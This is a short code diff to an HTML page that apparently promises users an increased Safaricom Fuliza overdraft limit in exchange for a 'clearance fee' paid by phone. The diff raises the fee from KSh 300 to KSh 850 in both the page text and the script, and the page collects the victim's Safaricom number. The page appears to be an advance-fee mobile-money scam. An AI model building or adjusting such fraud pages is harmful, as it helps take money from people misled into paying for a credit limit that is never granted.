@@ -82,8 +82,8 @@ This final payment covers: <br>
 Complete this step to instantly activate your new limit.
 </p>
 
-<div class="info">Selected Limit: <strong id="limitDisplay"></strong></div>
-<div class="info">Clearance Fee: <strong id="fee">KSh 300</strong></div>
+<div class="info">Selected Fuliza Limit: <strong id="limitDisplay"></strong></div>
+<div class="info">Clearance is Fee: <strong id="fee">KSh 850</strong></div>
 
 <input type="tel" id="phone" placeholder="Enter Safaricom Number (07XXXXXXXX / 01XXXXXXXX / 2547XXXXXXXX)">
 
@@ -100,7 +100,7 @@ Complete this step to instantly activate your new limit.
 
 <script>
 const selectedAmount = localStorage.getItem("selectedAmount");
-const clearanceFee = 3; // KSh 300
+const clearanceFee = 850; // KSh 850
 
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("limitDisplay").innerText = "KSh " + selectedAmount;
